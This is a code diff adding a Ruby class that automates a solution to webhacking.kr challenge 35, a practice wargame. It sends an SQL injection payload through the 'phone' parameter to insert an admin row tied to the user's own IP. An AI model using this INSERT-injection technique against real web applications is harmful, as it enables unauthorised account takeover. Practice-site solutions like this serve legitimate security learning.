@@ -707,6 +707,33 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 35
+  class Challenge35 < ChallengeBase
+    CHALLENGE = 35
+
+    PATH = '/challenge/web-17/'
+    PARAM_ID = 'id'
+    PARAM_PHONE = 'phone'
+    LOGIN = 'admin'
+    PAYLOAD = "1), ('#{LOGIN}', '$IP$', 1"
+
+    def exec
+      log('Determining your own IP address')
+      ip = myip
+      log("IP: #{ip}")
+
+      payload = PAYLOAD.sub('$IP$', ip)
+      query = URI.encode_www_form(
+        PARAM_ID => 'guest',
+        PARAM_PHONE => payload
+      )
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 36
   class Challenge36 < ChallengeBase
     CHALLENGE = 36
